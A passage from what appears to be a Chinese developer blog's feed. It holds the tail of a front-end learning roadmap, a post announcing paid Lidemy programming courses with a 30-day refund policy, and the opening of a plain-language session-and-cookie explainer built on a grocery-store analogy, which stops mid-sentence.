title="學習目標"></a>學習目標</h4><ol><li>知道什麼是 MVC</li><li>知道什麼是 ORM</li></ol><h3 id="12-後端部署"><a href="#12-後端部署" class="headerlink" title="12. 後端部署"></a>12. 後端部署</h3><p>既然都已經開始學後端了，那就把後端的流程全部跑完吧！接下來要學的東西是部署，你必須自己去租一台機器（AWS、Google Cloud 第一年都有一些優惠，沒有優惠的 DigitalOcean 最便宜的機器一個月也才五塊美金），然後把程式碼放上去。</p><p>還需要自己去買一個網域（Domain），並且學習 DNS 的設定，把網域對應到你買的機器。完成之後，就能夠擁有一個個人網站了，以後的作品集都可以放在自己的網站上。</p><h4 id="學習理由-11"><a href="#學習理由-11" class="headerlink" title="學習理由"></a>學習理由</h4><p>這是學習路線裡面最後一個有關後端的部分了，之後的內容都不會再有後端。你可能會想說身為網頁前端工程師，有必要學這麼多後端嗎？</p><p>你錯了，這些一點都不多，我覺得只是皮毛而已。後端的水一樣很深，我們學到的真的只是一些基礎，而這些後端概念是我認為許多前端工程師所欠缺的。</p><p>如同我前面說的一樣，網頁是由前端與後端組成，少了任何一邊都不夠完整。要你學這些後端不是為了讓你成為後端工程師，而是讓你在網頁出問題時能夠明確知道問題發生在哪裡。</p><h4 id="學習目標-11"><a href="#學習目標-11" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>知道如何設定網域（A、CNAME）</li><li>知道如何用 SSH 遠端連線到自己的主機</li><li>知道怎麼部署自己寫好的程式</li></ol><h3 id="中場總結"><a href="#中場總結" class="headerlink" title="中場總結"></a>中場總結</h3><p>以上的東西全部學完以後，我覺得基礎就算 ok 了。以學到的東西來說，已經可以把任何看得到的網站實作出來。真心不騙，只是功能可能陽春一點，速度慢一點，但真的做得出來。</p><p>任何網站都是由底下這些基礎組合而成，括弧裡面是學到的對應的技術：</p><ol><li>後端伺服器與商業邏輯（PHP + Apache）</li><li>資料庫（MySQL）</li><li>前端頁面與互動（HTML + CSS + JavaScript）</li></ol><p><img src="/img/front-end-learning-path-55201571ecfe/1__OwtfTb6aTniXF0aRlR4SBw.jpeg"></p><p>不知道大家有沒有玩過跑跑卡丁車？反正就是一個賽車遊戲。現在的情況就是，你已經學會開車、學會甩尾以及單噴，也學了常見地圖的跑法，一定可以跑到終點，只是時間快慢而已。</p><p>所以接下來要學的東西都只有一個目的：</p><blockquote><p>讓你跑得更快</p></blockquote><h3 id="13-jQuery-與-Bootstrap"><a href="#13-jQuery-與-Bootstrap" class="headerlink" title="13. jQuery 與 Bootstrap"></a>13. jQuery 與 Bootstrap</h3><p>在前面的段落裡與前端相關的部分幾乎沒有提到任何一個 library，而接下來的推薦學習路線會出現許多的 library 以及工具。</p><p>第一個是鼎鼎大名的 jQuery。不用學到多厲害，基本的東西會用就好。我覺得 jQuery 還是挺好用的，而且是前端發展史上面非常重要的一環。</p><p>再來是 Bootstrap，只想入門的話我也覺得不難學，就按照官方文件把元件的 CSS 加上 class 就差不多了。總之它是個 UI library，可以幫助你把畫面變得更漂亮也更有一致性。</p><p>前面有說過基礎已經學的差不多了，接下來的內容都會專注在「如何跑得更快」，而這兩個 library 我認為就有符合這個條件，藉由 jQuery 以及 Bootstrap 來提升自己的開發速度。</p><h4 id="學習理由-12"><a href="#學習理由-12" class="headerlink" title="學習理由"></a>學習理由</h4><p>學 jQuery 的理由是儘管它現在沒有那麼熱門了，但在小專案上面依然很好用，而且透過 jQuery 可以幫你減少一些原生很煩瑣的操作，節省時間。然後只是想要入門 jQuery 的話我覺得不用花多久時間，所以學一下比較好。</p><p>Bootstrap 的話則是能夠美化你的介面並且加速排版。</p><p>除了學新的工具以外，同時也是在訓練自己看文件的能力。今天你想要用 jQuery 來做 AJAX，應該要用哪個函式？想要套用 Bootstrap 的按鈕，class 應該怎麼用？這些都要透過 Google 或者是去官方文件查詢才會知道。看文件也是工程師的必備能力之一。</p><h4 id="學習目標-12"><a href="#學習目標-12" class="headerlink" title="學習目標"></a>學習目標</h4><p>我覺得可以用這兩個東西寫出一個 <a href="http://todomvc.com/examples/vanillajs/">TodoList</a> 就沒問題了。</p><h3 id="14-CSS-預處理器"><a href="#14-CSS-預處理器" class="headerlink" title="14. CSS  預處理器"></a>14. CSS  預處理器</h3><p>「跑得更快」的方法之一就是站在巨人的肩膀上，用著前輩們開發出來的好用工具，就能讓開發的速度更快，程式碼也更好維護。</p><p>而 CSS 預處理器就是這樣子的一個東西，可以讓你用像寫程式那樣子的方法來寫 CSS，可以定義變數、跑迴圈，甚至是呼叫函式。</p><p>知名的預處理器有 SaSS&#x2F;SCSS、Less 以及 Stylus 等等，這裡面隨便挑一套來學就好。會需要學這個是因為現在很少人直接寫 CSS 了，都是用 CSS 預處理器來編譯。</p><h4 id="學習理由-13"><a href="#學習理由-13" class="headerlink" title="學習理由"></a>學習理由</h4><p>幫助你寫出更好維護的 CSS，同時也提高開發效率。</p><h4 id="學習目標-13"><a href="#學習目標-13" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>了解 CSS 預處理器的目的以及原理</li><li>能夠把自己之前寫的 CSS 用任一預處理器改寫</li></ol><h3 id="15-非同步歷程：callback、promise-與-async-await"><a href="#15-非同步歷程：callback、promise-與-async-await" class="headerlink" title="15. 非同步歷程：callback、promise 與 async&#x2F;await"></a>15. 非同步歷程：callback、promise 與 async&#x2F;await</h3><p>在第八點「非同步與 AJAX」裡面就有學到了 Callback 的概念。由這個延伸出去可以學到 Promise，以及比較新的 async&#x2F;await 語法，這些都與非同步的概念息息相關。</p><h4 id="學習理由-14"><a href="#學習理由-14" class="headerlink" title="學習理由"></a>學習理由</h4><p>在 JavaScript 裡面，理解這些東西的使用以及發展歷程我覺得是滿重要的事情，因此特地給這個主題一個段落，畢竟這些東西應該要是放在一起學習的。</p><p>要學的理由是 JavaScript 裡許多東西是非同步的，而現在幾乎都會用 Promise 來處理非同步的問題，要理解這些語法才能知道如何使用。</p><h4 id="學習目標-14"><a href="#學習目標-14" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>知道如何使用 Promise</li><li>知道如何使用  .then 及  .catch</li><li>知道如何「同時」執行多個 Promise</li><li>知道如何「按照順序」執行多個 Promise</li><li>知道如何使用 async&#x2F;await</li></ol><h3 id="16-深入理解-JavaScript-與瀏覽器相關機制"><a href="#16-深入理解-JavaScript-與瀏覽器相關機制" class="headerlink" title="16. 深入理解 JavaScript 與瀏覽器相關機制"></a>16. 深入理解 JavaScript 與瀏覽器相關機制</h3><p>在前面我們學了比較多的工具，使我們可以利用它們打造出自己的產品。但除了工具以外，背後的原理也是很重要的。學習原理以及一些比較底層的概念，會讓你對這些技術更有信心，在發生問題時你能想到的地方也更多。</p><p>舉例來說，有時候碰到的問題可能跟 JavaScript 本身沒有關係，而是瀏覽器的運行機制導致這樣的結果。如果完全都不知道瀏覽器做了什麼，那可能會一直糾結在「問題一定出在這邊！」，但事實上根本不是。</p><p>這邊推薦的學習資源是 <a href="https://www.html5rocks.com/en/tutorials/internals/howbrowserswork/">How Browsers Work: Behind the scenes of modern web browsers</a>，裡面可以看到現代瀏覽器的執行方式。</p><p>還有 Chrome 滿 20 歲時所推出的 <a href="https://developers.google.com/web/updates/2018/09/inside-browser-part1">Inside look at modern web browser</a> 系列，都能夠大大增進你對於瀏覽器的理解。如果英文不好，上面這些文章都可以找到非官方的中文翻譯版本。</p><p>最後也推薦一堂 Google 在 Udacity 上開的課：<a href="https://www.udacity.com/course/website-performance-optimization--ud884">Website Performance Optimization</a>，裡面會提到瀏覽器解析 HTML 的過程以及載入資源的順序等等。</p><p>至於 JavaScript 的部分可以從一些常見的問題下手，例如說 closure、scope、this、hoisting 等等，都是常見的關鍵字。</p><p>這邊推薦俗擱大碗的 <a href="https://www.udemy.com/understand-javascript/">JavaScript: Understanding the Weird Parts</a>，也推薦 <a href="https://github.com/getify/You-Dont-Know-JS">You Don’t Know JS</a> 以及我自己之前寫的五篇相關文章：</p><ol><li><a href="https://github.com/aszx87410/blog/issues/18">該來理解 JavaScript 的原型鍊了</a></li><li><a href="https://github.com/aszx87410/blog/issues/30">深入探討 JavaScript 中的參數傳遞：call by value 還是 reference？</a></li><li><a href="https://github.com/aszx87410/blog/issues/34">我知道你懂 hoisting，可是你了解到多深？</a></li><li><a href="https://github.com/aszx87410/blog/issues/35">所有的函式都是閉包：談 JS 中的作用域與 Closure</a></li><li><a href="https://github.com/aszx87410/blog/issues/39">淺談 JavaScript 頭號難題 this：絕對不完整，但保證好懂</a></li></ol><h4 id="學習理由-15"><a href="#學習理由-15" class="headerlink" title="學習理由"></a>學習理由</h4><p>除了使用工具，你還要知道工具背後的原理是什麼。在發生問題時才能更精確地定位。</p><p>JavaScript 的部分我覺得對新手來說雖然有時候感受不出來，但它的確是重要的。很多時候新手會寫出相關的 bug 並踩到類似的問題，可是因為缺少了這些能力，所以不知道該如何找出問題在哪，也不知道怎麼 debug。</p><h4 id="學習目標-15"><a href="#學習目標-15" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>知道什麼是作用域（Scope）</li><li>你知道 Hoisting（提升）是什麼</li><li>你知道 Hoisting 的原理為何</li><li>你知道 Closure（閉包）是什麼</li><li>你能夠舉出一個運用 Closure 的例子</li><li>你知道 Prototype 在 JavaScript 裡是什麼</li><li>你知道大部分情況下 this 的值是什麼</li></ol><h3 id="17-gulp-與-webpack"><a href="#17-gulp-與-webpack" class="headerlink" title="17. gulp 與  webpack"></a>17. gulp 與  webpack</h3><p>當專案變得越來越大以後，可能就會需要一些工具來輔助開發。</p><p>gulp 能夠管理工作流程，可以用 gulp 來執行一系列的任務，例如說：</p><ol><li>把 SCSS 轉成 CSS</li><li>壓縮 CSS 檔案</li><li>把 ES6 用 babel 轉成 ES5</li><li>壓縮 JS 檔案</li><li>把 HTML 裡面的圖片都換成 webp 格式</li></ol><p>gulp 就只是個工作流程管理器而已，以上的功能都要額外安裝對應的 plugin 才能成功使用。</p><p>而 webpack 則是截然不同的東西，它是打包工具。以前瀏覽器原生並不支援在 Node.js 裡寫過的 import 與 export 這些語法（現在已經支援了），因此必須找一個打包工具來做這件事，webpack 的目的之一就是這個。</p><p>但除了這點以外，它把「打包」這件事情看得更廣，所有東西都是資源，不只有 JS 檔案。只要是資源都可以被 webpack 打包，在打包的過程中也可以透過 webpack 的 plugin 做一些事，例如說把 SCSS 轉成 CSS 或是壓縮 JS 檔案之類的。</p><p>會把兩個放在一起是因為這兩個常常被搞混，但我覺得可以很明顯看出他們本質上就是不同的。gulp 本身毫無作用，只是個任務管理員，真正的重點是底下執行了什麼任務；webpack 就是個打包工具，可以把你的前端專案打包起來，在打包過程可以順便利用 plugin 對資源做一些轉化。</p><p>如果你真的有理解這兩個東西，就會知道 webpack 也可以當作 gulp 的其中一個 task 來執行。</p><h4 id="學習理由-16"><a href="#學習理由-16" class="headerlink" title="學習理由"></a>學習理由</h4><p>為什麼要學這兩個東西呢？gulp 我覺得其實不學也行，但概念不難而且門檻不高，學一下也是很不錯的。而且會常常跟 webpack 搞混，學一下之後比較能解釋跟 webpack 的異同。</p><p>真正的重點其實是 webpack，我認為理解 webpack 在幹嘛是進入現代前端開發的重點之一。因為那些前端框架幾乎都使用了 webpack 來打包，如果不學 webpack 的話，你就永遠搞不懂它們在幹嘛。</p><h4 id="學習目標-16"><a href="#學習目標-16" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>知道 gulp 的目的以及原理</li><li>知道 webpack 的目的以及原理</li><li>熟悉如何使用 webpack 進行模組化開發</li><li>熟悉如何使用 gulp 建構自動化工作流程</li></ol><h3 id="18-物件導向"><a href="#18-物件導向" class="headerlink" title="18. 物件導向"></a>18. 物件導向</h3><p>物件導向這個東西我真的不太知道要放在哪裡，只好放在框架前面了。</p><p>其實在前面的過程中就可以慢慢培養物件導向的概念，例如說使用 XMLHttpRequest 或是使用 Promise 的時候，就有物件導向的概念在裡面。</p><p>這邊需要去學習物件導向的基本概念，以及如何使用 ES6 的 Class 語法還有繼承。有時間的話也可以學 ES5 的 prototype，畢竟 JavaScript 是 prototype-based，Class 只是語法糖而已。</p><p>物件導向如果真的要學，可以學的東西很多，開始學的時候會先被一大堆新名詞給淹沒，但建議先學一些比較常見或是在 JavaScript 比較常用的就行了，像是繼承（Inheritance）跟封裝（Encapsulation）。</p><p>至於多型（Polymorphism）或是多載（Overloading）這些都可以先放著，稍微看一下有個概念就好，未來有機會的話再去深入學習。</p><h4 id="學習理由-17"><a href="#學習理由-17" class="headerlink" title="學習理由"></a>學習理由</h4><p>下個部分要進入到前端框架了，在學習前端框架以前必須要有物件導向的觀念，不然有一大堆用法你會看不懂在幹嘛。</p><h4 id="學習目標-17"><a href="#學習目標-17" class="headerlink" title="學習目標"></a>學習目標</h4><ol><li>知道什麼是 Class</li><li>知道 Class 與 Instance 的區別</li><li>知道什麼是 super()</li><li>知道如何使用 ES6 的 Class，能夠寫出簡單的物件導向程式</li><li>知道什麼是繼承（Inheritance）</li></ol><h3 id="19-React-Vue-Angular-三選一"><a href="#19-React-Vue-Angular-三選一" class="headerlink" title="19. React&#x2F;Vue&#x2F;Angular 三選一"></a>19. React&#x2F;Vue&#x2F;Angular 三選一</h3><p>前面學了這麼多東西，這個學習路線也漸漸接近尾聲，終於到了學習前端框架的時候（React 嚴格來說不算是框架，但它跟整個生態系合起來我覺得算是一個框架，所以就稱它為框架了）。</p><p>在學習的部分，三大框架 React&#x2F;Vue&#x2F;Angular 可以選一套來學就好，Vue 好像比較容易上手，但我只會 React 而且我推薦 React。我完全沒用過其他兩套，推薦學 React 只是因為我比較喜歡它（對，是個很薄弱的理由）。</p><p>React 的學習資源我推薦從 <a href="http://huziketang.mangojuice.top/books/react/">React 小書</a>開始，是我認為不可多得的資源，前四個 lesson 是精華，不直接教 React 卻讓你學會 React。看完之後可以看<a href="https://reactjs.org/tutorial/tutorial.html">官方教學</a>，內容也很豐富。</p><p>前端框架的部分要掌握核心概念以及基礎用法，以 React 來說，核心概念就是：state 對應到 UI，你要改變 UI，改變 state 就好。UI 只是 state 的呈現，所以基本上你不會直接動到 UI，而是改變 state，再讓 React 幫你重新繪製 UI。除此之外，Component 跟 JSX 也是滿重要的觀念，React 的幾個生命週期也必須好好搞懂。</p><p>總之呢，進入到現代的前端開發以後我覺得就差不多了。如果上面講的都有好好學的話，你在我心目中已經是個基礎不錯的網頁前端工程師了。</p><h4 id="學習理由-18"><a href="#學習理由-18" class="headerlink" title="學習理由"></a>學習理由</h4><p>為什麼要把前端框架放那麼後面？</p><p>因為我覺得學習這些前端框架是必須要有基礎的，沒有基礎的話只會死得很難看，根本不知道在學什麼。至少要能熟練的使用 JavaScript 以及理解物件導向，還要會一點基本的 webpack，最後才來學前端框架。</p><p>我認為框架本來就不是給新手用的東西，請先把基礎打好再來學框架，這樣才叫事半功倍。直接學框架是事倍功半，請一步一步來。有很多新手太早學框架，導致於碰到問題時不知道是框架的問題還是 JavaScript 本身的問題，這就會被我稱作是基礎不穩。</p><h4 id="學習目標（以-React-為例）"><a href="#學習目標（以-React-為例）" class="headerlink" title="學習目標（以 React  為例）"></a>學習目標（以 React  為例）</h4><ol><li>知道 React 的目的以及原理</li><li>知道我們為什麼需要 React</li><li>知道使用 React 跟之前使用 jQuery 的區別</li><li>理解 state 跟 props 的不同</li><li>熟悉 React 基本操作</li></ol><h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><p>學的東西很多嗎？不少，但這只是個開始而已，還有很多主題我沒提到呢。</p><p>上面這些只是我認為的基礎而已，從每一項基礎都可以再延伸出許多更深入的議題，例如說 React 專案越來越大之後就會遇到一些狀態管理的問題，延伸出 Redux 以及一些 Redux middleware。</p><p>或者是 CSS 越寫也會越複雜，會接觸到一些 <a href="https://blog.techbridge.cc/2017/04/29/css-methodology-atomiccss/">CSS 方法論</a>如 OOCSS、SMACSS、BEM 以及 Functional CSS。</p><p>我還沒有提網頁效能優化呢，像是從伺服器端的 gzip、Cache、CDN、HTTP&#x2F;2 再到前端的 lazy loading、圖片壓縮、<a href="https://developers.google.com/web/fundamentals/performance/prpl-pattern/">PRPL Pattern</a> 或是 code splitting，有太多太多東西可以學習以及研究。</p><p>成為一個網頁前端工程師容易嗎？</p><p>看你自己對這個職業的標準是什麼。如果你只是想要找到一份職稱為「網頁前端工程師」的工作的話，以現在的情況來說我覺得沒有很難。就如同我開頭所說的，若是以快速求職為導向，很多我提到的東西都不需要學。</p><p>但若是你想把基礎打得好一點，讓未來的自己能走得更順遂一點，那當然不是件容易的事。想要成為工程師很容易，但想要成為基礎紮實的工程師就是另外一回事了。</p><p>希望這份落落長的清單能對想要學習網頁前端或是想加強自己網頁前端基礎的人有幫助。</p><p>最後，感謝幫我先看過文章並給予建議的朋友們。</p><p>想持續關注的話可以 follow 一下。單純手癢想按按鈕也可以按個 follow，或是考慮一下關注 <a href="/2019/08/19/lidemy-courses-fda610c7ff9b/">Lidemy 粉絲專頁</a>。</p><p>想看更多文章可以參考我的 Medium 文章列表：<a href="https://aszx87410.github.io/blog/medium">https://aszx87410.github.io/blog/medium</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lidemy 新課程上架以及課程說明</title>
      <link href="/2019/08/20/lidemy-courses-fda610c7ff9b/"/>
      <url>/2019/08/20/lidemy-courses-fda610c7ff9b/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/lidemy-courses-fda610c7ff9b/1____Jndg6GFlBuNHbqrjMQRkA.png"></p><p><a href="/2018/09/18/hahow-and-lidemy-2dab35919bb8/">Lidemy</a></p><p>從這之後，就沒有新的課程上架了。</p><h3 id="對於是否上架的猶豫"><a href="#對於是否上架的猶豫" class="headerlink" title="對於是否上架的猶豫"></a>對於是否上架的猶豫</h3><p>但這並不是說一年間我都沒有新的課程，正好相反，在這一年之間我多錄了五六個課程，目標對象都是<a href="https://github.com/Lidemy/mentor-program-3rd">程式導師實驗計畫第三期</a>的學生。</p><p>但這些課程我一開始並沒有打算要上架，原因很簡單，那就是我覺得品質還不夠。</p><p>這些課程都是錄給我自己學生看的而非對外販售，所以我就當作一般正常講課，除非真的出重大錯誤否則不會重錄。大部分的影片都是一次 OK，沒有後製也沒有字幕，直接就把影片丟到課程平台了。</p><p>再者，也因為這些課程都是給程式導師實驗計畫用的，所以其實是有順序的，在某堂課裡面可能會講到：「就像我們之前有提過的 xxx」，xxx 就是前面的教學內容，會在別支教學影片裡面。如果把這些課程作為單一的線上課程上架，會碰到的問題就是只買這個課程的學生並沒有我裡面所提到過的基礎，很有可能會搞不懂我在講什麼。</p><p>而課程品質還是最大的問題，我心目中理想的線上課程必須把一個主題講得很詳細，至少基本的東西都要涵蓋到。若是這樣的話，課程長度就會變得比較長，東西也會完整很多。但在我的教學計畫裡面，我會在課程刻意留白，刻意留一些內容不講讓他們自己去查，所以錄給他們的影片只會講入門與基礎，不會帶到太多或是太深的東西。</p><p>就是因為以上這些原因，讓我遲遲沒有公開這些線上課程，只有我自己的學生可以看得到。</p><h3 id="心態的轉變"><a href="#心態的轉變" class="headerlink" title="心態的轉變"></a>心態的轉變</h3><p>但後來我心態有慢慢在轉變了。</p><p>對，課程品質可能還沒達到我預期的標準，課程內容沒有很完整，影片質量也普普通通，這些都是事實。</p><p>但儘管不夠完整，卻依然對有些初學者是有幫助的。雖然不完整，但很多影片對於「入門」這件事其實挺有幫助的。很多初學者的煩惱都是入門，只要入了門，其他剩下的基礎都可以自己補齊，但就是少一個入門的教學資源。</p><p>這期間有偶爾會收到信，問我說會不會教某某課程，或是能不能開放某某課程的影片之類的。</p><p>我後來仔細想了想，覺得開放出去賣也沒關係。</p><p>這前提其實是建立在 Lidemy 的退費機制上面，像是 30 天無條件退費。如果你真的上了之後覺得不合適，跟你想像中有差異，在 30 天內都可以全額退費，任何理由都可以。</p><p>這樣子我就把選擇權交到消費者那一端了，「我的課程大綱長這樣、教學影片長這樣、價格長這樣，你可以自己選擇買或不買。買了若不滿意 30 天內可以退費」，所以要不要買或是買了要不要退，都是消費者自己的選擇。</p><p>原本我不公開賣課程，擔心的是他們會買到品質不好的課，這樣我就會覺得自己是不是有騙錢的嫌疑。可是有了退費機制之後，如果真的覺得品質不好，是可以全額退費的，這樣就沒有什麼騙不騙錢了，因為選擇是在消費者那一端。如果你覺得不滿意，退費就行了；如果你覺得滿意，那就買下來吧。</p><p>所以我前幾天下午把課程整理了一下，全部開放出去了，目前 Lidemy 對外公開的有這些付費課程：</p><ol><li><a href="https://www.lidemy.com/p/git101">[GIT101] Git 超新手入門</a></li><li><a href="https://www.lidemy.com/p/cmd101-command-line">[CMD101] Command line 超新手入門</a></li><li><a href="https://www.lidemy.com/p/js101-javascript">[JS101] 用 JavaScript 一步步打造程式基礎</a></li><li><a href="https://www.lidemy.com/p/js102-javascript-es6-npm">[JS102] 升級你的 JavaScript 技能：ES6 + npm + Jest</a></li><li><a href="https://www.lidemy.com/p/net101-js">[NET101] 網路基礎概論（搭配 JS 實作練習）</a></li><li><a href="https://www.lidemy.com/p/fe101-html-css">[FE101] 前端基礎：HTML 與 CSS</a></li><li><a href="https://www.lidemy.com/p/fe102-javascript">[FE102] 前端必備：JavaScript</a></li><li><a href="https://www.lidemy.com/p/js201-javascript">[JS201] JavaScript 進階：那些你一直搞不懂的地方</a></li><li><a href="https://www.lidemy.com/p/be101-php-mysql">[BE101] 用 PHP 與 MySQL 學習後端基礎</a></li><li><a href="https://www.lidemy.com/p/be201-express-sequelize">[BE201] 後端中階：Express 與 Sequelize</a></li><li><a href="https://www.lidemy.com/p/fe301-react">[FE301] React 基礎</a></li></ol><p>這些課程之前是讓我學生搭配著<a href="https://github.com/Lidemy/mentor-program-3rd">程式導師實驗計畫第三期</a>在看的，現在把它全部公開出來販售。有興趣的朋友可以自己參考課綱來決定要購買哪些課程。</p><p>這是 Lidemy 的網址：<a href="https://www.lidemy.com/">https://www.lidemy.com</a>，也可以直接點進去這邊查看所有課程。</p><p>最後再強調一次，這些課程基本上都提供了至少 1&#x2F;3 的內容給大家試看，課程大綱也都完整打出來了，請大家慢慢挑慢慢選，看完大綱以及試看過後覺得符合自己需求再來購買。</p><p>購買後如果 30 天內覺得有問題，都可以寫信過來辦理退費，信裡面可以講一下原因（但這不是審查，我只是想知道該怎麼改進）。</p><p>就是這樣啦，希望這些課程對你有幫助。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白話 Session 與 Cookie：從經營雜貨店開始</title>
      <link href="/2019/08/09/session-and-cookie-15e47ed838bc/"/>
      <url>/2019/08/09/session-and-cookie-15e47ed838bc/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/session-and-cookie-15e47ed838bc/0______k__NwbytNrqrFJP.jpg"></p><p>在 Web 開發裡面有一個歷久不衰的議題，那就是 Session 與 Cookie 的區別。從我剛開始學程式時這一題就常出現在面試考題裡，一直到現在都還是能看見這個問題。</p><p>這個問題重要嗎？</p><p>我覺得滿重要的。因為 Session 所代表的是「狀態」，如果沒有了狀態，一大堆功能都會失效。對於工程師來說必須去理解什麼是 Session，以及如何實作它，而 Cookie 就是這之中很重要的一環。</p><p>因此這會是一系列的文章，我稱之為 Session 與 Cookie 三部曲，會由淺入深，從不同的面向去看 Session 與 Cookie。</p><p>這是系列文的第一篇，想用簡單白話的方式通俗地跟大家解釋什麼是 Session，什麼又是 Cookie，目標是希望沒有任何技術背景的人也能夠看懂。</p><p>三篇的完整連結如下：</p><p>1. <a href="/2019/08/09/session-and-cookie-15e47ed838bc/">白話 Session 與 Cookie：從經營雜貨店開始</a><br>2. <a href="https://github.com/aszx87410/blog/issues/45">淺談 Session 與 Cookie：一起來讀 RFC</a><br>3. <a href="https://github.com/aszx87410/blog/issues/46">深入 Session 與 Cookie：Express、PHP 與 Rails 的實作</a></p><p>要向沒有技術背景的人講這種概念性的東西，用一堆專有名詞絕對是最差勁的做法。而最好的做法通常是舉一個現實生活中很貼近的例子，藉由這種方式比較能讓毫無技術背景的讀者們去理解這到底是個什麼東西。</p><p>因此，我們從經營雜貨店開始吧！</p><h3 id="小明の雜貨店"><a href="#小明の雜貨店" class="headerlink" title="小明の雜貨店"></a>小明の雜貨店</h3><p>四十歲的小明退休以後在家閒得發慌，每一天都過得毫無目標而且渾渾噩噩。「退休以後不是應該無憂無慮嗎？」小明也是這樣問自己的，但沒辦法，他深知自己的個性就是這樣，沒辦法閒下來，一定要做點事情才行。</p><p>於是，小明就用了退休金在家裡附近的巷口開了間雜貨店，並且取名為：「小明の雜貨店」，是個毫無創意的名稱，但把自己的名字放在招牌上一直是他的夢想。</p><p>小明平時人緣還算不錯，在倒垃圾時會與旁邊的婆婆媽媽閒聊，說著那個誰誰誰的兒子考上了台大，誰誰誰的女兒最近交了個男友，成為左鄰右舍八卦網路的一部分。</p><p>不只婆婆媽媽，連年輕的那一代也對他感覺不錯，八成是因為他很識相地不會硬要跟年輕人尬聊，看到他們都只是簡單點個頭示意一下，而不是像其他人劈頭就把私事全都問了一遍。</p><p>因此在開幕那天，雜貨店好比 Apple Store 開幕一般（除了沒有人特地前一天就跑來排隊以外），周遭的鄰居們都跑來捧場，把整個店擠得水泄不通，單日營收甚至上看百萬。第一天就能有如此成績，可見人緣是多麽重要的一件事。有人緣，有人潮；有人潮，有錢潮。</p><p>但開幕畢竟是開幕，通常都是一家商店這輩子的巔峰，除非有跳樓大拍賣（假的那種不算，例如說每天都在大拍賣的）或是週年慶，不然都很難超越了。</p><p>隨著日曆一張張被撕開，店裡的生意慢慢恢復正常，還是喜歡傳統便利商店的都跑回去便利商店了，而嫌遠懶得走這麼多路的則選擇雜貨店消費。</p><p>看似步上正軌的雜貨店，問題卻隨著時間慢慢浮上檯面。</p><h3 id="臉盲症的困擾"><a href="#臉盲症的困擾" class="headerlink" title="臉盲症的困擾"></a>臉盲症的困擾</h3><p>小明身為雜貨店的店長兼唯一的店員，所有大小事都是他一個人在處理。傳統雜貨店跟便利商店最大的差別在哪裡？在於人情味。</p><p>就像是你去菜市場買菜的時候會被說帥哥或美女，或者是去買早餐的時候老闆會問你：「一樣？」，你只要點個頭就行了。這些人與人之間的情感是無論資訊怎麼發展都無法取代的。</p><p>可是小明沒有辦法，因為他根本記不起來是同一個人。</p><p>每一個來店裡的人對小明來說都是一個獨立的個體，是完全不相干的。你可能會疑惑說：「就算認不出臉，認聲音、衣服、氣味也都可以吧？」，看來你是太低估小明了。</p><p>小明不只認不出臉，他什麼都認不出來。我也不知道小明到底哪裡出了差錯，小明自己也不知道。但總之就是這樣，就算你每天來，每天穿著一樣的衣服，用著一樣的聲音，他都認不出來你是同一個人。</p><p>講一個例子你就知道了，有一次有個顧客結完帳以後把發票忘在櫃檯，一出店門口才想起來，就立刻跑回去拿。結果小明完全沒認出來是同一個人，還以為這人是想來偷拿發票的，跟他確認過買的品項一致以後才願意把發票還給他。</p><p>對，就是這麼誇張，小明每一次結帳都是在幫一個全新的人結帳。</p><p>在生活上或許沒什麼問題，反正小明無依無靠也沒朋友，自己一個人生活慣了，可是在經營雜貨店上面就有很大的問題了。除了會讓人覺得很沒有人情味以外，最大的問題就是有些顧客的需求他沒辦法處理。</p><p>有些人逛雜貨店喜歡慢慢挑慢慢選嘛，然後有些物品可能又很重，或者是在結帳的時候才突然想起來還要買什麼，這時候就會把東西先放在收銀台那裡，自己跑回去拿其他品項。</p><p>我前面已經提過了，小明認人的能力是零，當客人拿新的物品回去收銀台的時候，小明已經認不出他來了。因此他不知道收銀台上面那些物品是誰的，客人也很難跟小明證明說：「對，這些是我剛剛想買的」。</p><p>這個使用者體驗簡直差到不行，因此店裡的生意每況愈下，只有那種果斷型顧客會來消費（一進雜貨店就往自己的目標走，拿完之後立刻結帳的那種）。</p><p>小明當然注意到了這個狀況，也知道不能再這樣下去了，繼續這樣的話大概不用兩個月店就會倒了。於是小明左思右想，快思慢想，東想西想，終於想到了一個解決方法。</p><h3 id="方法雖老舊但有用"><a href="#方法雖老舊但有用" class="headerlink" title="方法雖老舊但有用"></a>方法雖老舊但有用</h3><p>前面有提到過小明最大的問題是「每個客人都是新的客人」，他沒辦法認出他們是同一個客人，所以自然也無法記住他們的「狀態」，而這個才是最大的問題。</p><p>山不轉路轉，路不轉頭轉，既然小明自己沒辦法記住狀態，寫張紙條不就得了嗎？當你在收銀台結帳的時候寫一張紙條給你，上面寫著：「五香乖乖 x1、義美鮮奶茶 x1」，然後你就可以回去挑其他你想要的東西，當你再回來收銀台的時候把這張紙條給小明，小明就知道這些東西是你的。</p><p>或者你是個常客，每次來都買一樣的東西，小明就在結帳時寫給你一張紙條，把你常買的東西全都寫上去，這樣下次結帳時你只要帶那一張紙條過來，小明就知道你常買什麼了！</p><p>你有看過那種淒美愛情電影嗎？男女主角其中一方得了罕見疾病，每天都會徹底失憶一次，另一方就會在家裡幫他寫滿便條紙，透過那些便條紙，主角才能知道自己是誰、對方是誰，以及自己到底發生了什麼事。</p><p>對，你可以把小明想像成就是失憶的那個，而便條紙就是給客人的紙條。既然自己記不住，就讓這些紙條代勞，把狀態放在上面。</p><p>雖然說客人要把紙條留著其實滿不方便的，但前面說過小明人緣其實不錯，因此常客都會看在他的面子上把紙條帶著，讓這個機制得以繼續運作。而小明店裡的生意也因此好轉一點點。</p><p>對，只有一點點而已，因為隨身攜帶一張紙條實在是太麻煩了，所以也沒多少人會這樣做。</p><p>再繼續往下講之前，我們先進入中場休息。</p><h3 id="中場休息"><a href="#中場休息" class="headerlink" title="中場休息"></a>中場休息</h3><p>讓我們先從比喻回到網路世界裡，HTTP 